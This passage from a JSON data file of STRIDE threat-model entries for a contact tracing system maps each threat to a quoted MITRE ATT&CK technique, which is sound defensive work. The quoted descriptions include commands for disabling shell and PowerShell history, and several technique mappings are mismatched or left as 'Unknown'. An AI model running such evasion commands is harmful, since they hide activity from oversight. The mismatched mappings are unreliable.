            "Assumptions": [
                {
                    "Assumption": "Service server lacks robust DDoS protection.",
                    "Role": "System Administrator",
                    "Condition": "Absence of DDoS mitigation strategies."
                },
                {
                    "Assumption": "High volume of traffic can exhaust server resources.",
                    "Role": "Network Administrator",
                    "Condition": "Limited server capacity."
                },
                {
                    "Assumption": "The infrastructure is not designed to handle unexpected spikes in traffic.",
                    "Role": "Infrastructure Engineer",
                    "Condition": "Lack of scalability and redundancy."
                }
            ],
            "Potential Impact": "Service disruption, impacting the ability to download and process exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Service Server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a vulnerability in the mobile application to gain administrative access to the system.",
            "Assumptions": [
                {
                    "Assumption": "Mobile application contains a privilege escalation vulnerability.",
                    "Role": "Application Developer",
                    "Condition": "Code vulnerabilities not identified and resolved."
                },
                {
                    "Assumption": "No effective security mechanisms to prevent unauthorized admin access.",
                    "Role": "System Administrator",
                    "Condition": "Lack of security controls and patches."
                },
                {
                    "Assumption": "Attackers can perform actions with elevated privileges.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of vulnerability."
                }
            ],
            "Potential Impact": "Complete control over the application and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Mobile App",
                "Vulnerability Exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploiting server vulnerabilities could elevate their privileges to access sensitive data on the central server.",
            "Assumptions": [
                {
                    "Assumption": "Server vulnerabilities exist allowing for privilege escalation.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched server infrastructure."
                },
                {
                    "Assumption": "The server does not have sufficient access controls.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate access control mechanisms."
                },
                {
                    "Assumption": "Exploited vulnerability provides higher-level access.",
                    "Role": "Attacker",
                    "Condition": "Successful exploitation of server vulnerability."
                }
            ],
            "Potential Impact": "Compromise of sensitive data and potential system manipulation.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Server",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware installed on user devices could exploit vulnerabilities to gain elevated privileges and access sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "User devices are susceptible to malware.",
                    "Role": "User",
                    "Condition": "Inadvertent download of malware."
                },
                {
                    "Assumption": "The mobile application has vulnerabilities that can be exploited for privilege elevation.",
                    "Role": "Application Developer",
                    "Condition": "Security flaws in the application."
                },
                {
                    "Assumption": "Users do not use adequate security measures to protect their devices.",
                    "Role": "User",
                    "Condition": "Lack of device security."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Malware",
                "User Devices"
            ],
            "mitre_technique": {
                "name": "Create or Modify System Process",
                "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
                "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
                "technique_id": "T1543"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake contact tracing app that mimics the legitimate app to collect sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Users download apps from unofficial sources.",
                    "Role": "End User",
                    "Condition": "User neglects app source integrity."
                },
                {
                    "Assumption": "The malicious app is convincingly similar.",
                    "Role": "Attacker",
                    "Condition": "Attacker has resources to create a realistic copy."
                },
                {
                    "Assumption": "The app store fails to detect the fake app.",
                    "Role": "App Store Provider",
                    "Condition": "App store security measures are insufficient."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "social engineering",
                "fake application"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker intercepts Bluetooth communications to impersonate another device.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth is used for proximity detection.",
                    "Role": "System Architect",
                    "Condition": "Bluetooth is the chosen communication medium."
                },
                {
                    "Assumption": "No mutual authentication between devices.",
                    "Role": "System Architect",
                    "Condition": "Devices do not verify identities."
                },
                {
                    "Assumption": "Attacker is within Bluetooth range.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to targets."
                }
            ],
            "Potential Impact": "Unauthorized disclosure and potential tampering of data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "bluetooth",
                "impersonation",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor uses stolen credentials to gain access to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are stored insecurely or reused.",
                    "Role": "End User",
                    "Condition": "Poor credential management practices."
                },
                {
                    "Assumption": "Lack of multi-factor authentication.",
                    "Role": "System Architect",
                    "Condition": "MFA is not enforced."
                },
                {
                    "Assumption": "Central server is internet-facing.",
                    "Role": "System Architect",
                    "Condition": "Server accessible from external networks."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential tampering.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "unauthorized access",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker modifies contact tracing data on a user's device to falsify exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "Device is jailbroken or rooted.",
                    "Role": "End User",
                    "Condition": "User modifies device security settings."
                },
                {
                    "Assumption": "App lacks local data integrity checks.",
                    "Role": "System Architect",
                    "Condition": "No integrity verification mechanisms in place."
                },
                {
                    "Assumption": "Attacker has physical or remote access to the device.",
                    "Role": "Attacker",
                    "Condition": "Access obtained through social engineering or malware."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to false exposures or missed alerts.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data modification",
                "local access",
                "exposure notification"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies application code on the central server to manipulate contact tracing results.",
            "Assumptions": [
                {
                    "Assumption": "Insider has administrative access.",
                    "Role": "Insider",
                    "Condition": "Granted high-level permissions."
                },
                {
                    "Assumption": "Lack of code review and monitoring processes.",
                    "Role": "System Architect",
                    "Condition": "Insufficient DevSecOps practices."
                },
                {
                    "Assumption": "Changes can be deployed without detection.",
                    "Role": "Insider",
                    "Condition": "No continuous monitoring or auditing."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to tampered contact tracing data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "code manipulation",
                "server-side"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers inject malicious data into communication between devices.",
            "Assumptions": [
                {
                    "Assumption": "No encryption or validation of exchanged data.",
                    "Role": "System Architect",
                    "Condition": "Lack of secure communication protocols."
                },
                {
                    "Assumption": "Attacker can intercept and modify data in transit.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle capability."
                },
                {
                    "Assumption": "Devices accept incoming data without verification.",
                    "Role": "Devices",
                    "Condition": "No integrity checks on received data."
                }
            ],
            "Potential Impact": "Data integrity compromised, potentially leading to false exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data injection",
                "man-in-the-middle",
                "communication protocol"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny having received exposure notifications by deleting logs.",
            "Assumptions": [
                {
                    "Assumption": "Users can access and modify local log files.",
                    "Role": "End User",
                    "Condition": "Log files are not protected."
                },
                {
                    "Assumption": "Application does not enforce audit trails.",
                    "Role": "System Architect",
                    "Condition": "No mandatory audit logging."
                },
                {
                    "Assumption": "Log files are stored locally without redundancy.",
                    "Role": "System Architect",
                    "Condition": "No cloud backup or central logging."
                }
            ],
            "Potential Impact": "Loss of accountability and tracking data, making audit and verification difficult.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "audit trail",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Healthcare providers deny having modified exposure data after an accidental or malicious change.",
            "Assumptions": [
                {
                    "Assumption": "Lack of sufficient logging on the server.",
                    "Role": "System Architect",
                    "Condition": "Server activities are not comprehensively logged."
                },
                {
                    "Assumption": "Logs are not immutable.",
                    "Role": "System Architect",
                    "Condition": "Logs can be altered post-factum."
                },
                {
                    "Assumption": "No authentication for log access.",
                    "Role": "System Architect",
                    "Condition": "Logs are accessible without restrictions."
                }
            ],
            "Potential Impact": "Loss of data integrity and accountability, risking unreliable contact tracing results.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit logging",
                "log integrity",
                "server-side"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users claim they haven't uploaded their rolling keys after testing positive for COVID-19.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks secure transaction logging for key uploads.",
                    "Role": "System Architect",
                    "Condition": "No detailed records of key uploads."
                },
                {
                    "Assumption": "Key upload processes are not strictly monitored.",
                    "Role": "System Architect",
                    "Condition": "Uploads are not tracked in real-time."
                },
                {
                    "Assumption": "Users can manually intervene in the upload process.",
                    "Role": "End User",
                    "Condition": "Key uploads can be interrupted or cancelled."
                }
            ],
            "Potential Impact": "Data accountability is compromised, making tracking and auditing difficult.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "key upload",
                "transaction logging",
                "audit"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is exposed through unencrypted data transmission over the internet.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System Architect",
                    "Condition": "No encryption implemented for data transmission."
                },
                {
                    "Assumption": "Sensitive data is part of the communication payload.",
                    "Role": "System Architect",
                    "Condition": "Unencrypted data includes sensitive information."
                },
                {
                    "Assumption": "Attacker has the ability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network interception capabilities, e.g., sniffing."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted transmission",
                "interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Access to centralized server's database is not properly restricted, leading to data leaks.",
            "Assumptions": [
                {
                    "Assumption": "Database access control policies are inadequate.",
                    "Role": "System Architect",
                    "Condition": "Lack of strong access controls."
                },
                {
                    "Assumption": "Server vulnerabilities are not patched.",
